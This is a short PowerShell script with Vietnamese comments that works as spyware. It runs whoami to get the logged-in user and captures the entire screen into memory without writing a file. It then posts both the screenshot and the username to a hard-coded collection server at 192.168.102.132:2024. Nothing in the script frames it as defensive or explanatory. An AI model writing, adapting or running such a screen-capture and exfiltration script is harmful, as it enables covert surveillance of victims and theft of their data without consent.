# Địa chỉ server nhận dữ liệu
$hq = "http://192.168.102.132:2024"

# Lấy tên người dùng hiện tại
$name = whoami

# Chụp màn hình trực tiếp vào bộ nhớ
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)

# Chuyển ảnh sang MemoryStream thay vì lưu vào file
$memoryStream = New-Object System.IO.MemoryStream
$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
$imageData = $memoryStream.ToArray()

# Giải phóng tài nguyên ngay lập tức
$bitmap.Dispose()
$graphics.Dispose()
$memoryStream.Dispose()

# Gửi dữ liệu không đồng bộ
Function Send-Data {
    param (
        [string]$uri,
        [byte[]]$imageData = $null,
        [string]$jsonData = $null
    )
    $client = New-Object System.Net.Http.HttpClient
    if ($imageData) {
        # Tạo nội dung ảnh dạng ByteArrayContent
        $content = New-Object System.Net.Http.ByteArrayContent($imageData)
        $content.Headers.ContentType = 'application/octet-stream'
        $response = $client.PostAsync($uri, $content).Result
        Write-Output "Image upload status: $($response.StatusCode)"
    }
    if ($jsonData) {
        # Tạo nội dung JSON dạng StringContent
        $content = New-Object System.Net.Http.StringContent($jsonData, [System.Text.Encoding]::UTF8, 'application/json')
        $response = $client.PostAsync($uri, $content).Result
        Write-Output "Data upload status: $($response.StatusCode)"
    }
    $client.Dispose()
}

# Gửi hình ảnh
Send-Data -uri "$hq/upload" -imageData $imageData

# Gửi tên người dùng
$data = @{ name = $name }
$jsonData = $data | ConvertTo-Json -Depth 10
Send-Data -uri "$hq/data" -jsonData $jsonData
